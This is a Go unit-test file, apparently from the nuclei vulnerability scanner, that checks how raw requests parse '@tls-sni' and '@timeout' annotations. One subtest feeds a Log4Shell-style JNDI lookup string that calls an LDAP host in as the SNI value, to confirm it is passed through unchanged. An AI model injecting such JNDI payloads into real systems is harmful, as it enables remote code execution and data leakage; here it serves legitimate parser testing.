package http

import (
	"context"
	"net/http"
	"testing"

	"github.com/projectdiscovery/nuclei/v3/pkg/protocols/http/httpclientpool"
	"github.com/projectdiscovery/retryablehttp-go"
	"github.com/stretchr/testify/require"
)

func TestRequestParseAnnotationsSNI(t *testing.T) {
	t.Run("compliant-SNI-value", func(t *testing.T) {
		req := &Request{connConfiguration: &httpclientpool.Configuration{}}
		rawRequest := `@tls-sni: github.com
		GET / HTTP/1.1
		Host: {{Hostname}}`

		httpReq, err := retryablehttp.NewRequest(http.MethodGet, "https://example.com", nil)
		require.Nil(t, err, "could not create http request")

		overrides, modified := req.parseAnnotations(rawRequest, httpReq)
		require.True(t, modified, "could not apply request annotations")
		require.Equal(t, "github.com", overrides.request.TLS.ServerName)
		require.Equal(t, "example.com", overrides.request.URL.Hostname())
	})
	t.Run("non-compliant-SNI-value", func(t *testing.T) {
		req := &Request{connConfiguration: &httpclientpool.Configuration{}}
		rawRequest := `@tls-sni: ${jndi:ldap://${hostName}.test.com}
		GET / HTTP/1.1
		Host: {{Hostname}}`

		httpReq, err := retryablehttp.NewRequest(http.MethodGet, "https://example.com", nil)
		require.Nil(t, err, "could not create http request")

		overrides, modified := req.parseAnnotations(rawRequest, httpReq)
		require.True(t, modified, "could not apply request annotations")
		require.Equal(t, "${jndi:ldap://${hostName}.test.com}", overrides.request.TLS.ServerName)
		require.Equal(t, "example.com", overrides.request.URL.Hostname())
	})
}

func TestRequestParseAnnotationsTimeout(t *testing.T) {
	t.Run("positive", func(t *testing.T) {
		request := &Request{
			connConfiguration: &httpclientpool.Configuration{NoTimeout: true},
		}
		rawRequest := `@timeout: 2s
		GET / HTTP/1.1
		Host: {{Hostname}}`

		httpReq, err := retryablehttp.NewRequest(http.MethodGet, "https://example.com", nil)
		require.Nil(t, err, "could not create http request")

		overrides, modified := request.parseAnnotations(rawRequest, httpReq)
		require.NotNil(t, overrides.cancelFunc, "could not initialize valid cancel function")
		require.True(t, modified, "could not get correct modified value")
		_, deadlined := overrides.request.Context().Deadline()
		require.True(t, deadlined, "could not get set request deadline")
	})

	t.Run("negative", func(t *testing.T) {
		request := &Request{
			connConfiguration: &httpclientpool.Configuration{},
		}
		rawRequest := `GET / HTTP/1.1
		Host: {{Hostname}}`

		httpReq, err := retryablehttp.NewRequestWithContext(context.Background(), http.MethodGet, "https://example.com", nil)
		require.Nil(t, err, "could not create http request")

		newRequestWithOverrides, modified := request.parseAnnotations(rawRequest, httpReq)
		require.Nil(t, newRequestWithOverrides.cancelFunc, "cancel function should be nil")
		require.False(t, modified, "could not get correct modified value")
		_, deadlined := newRequestWithOverrides.request.Context().Deadline()
		require.False(t, deadlined, "could not get set request deadline")
	})
}
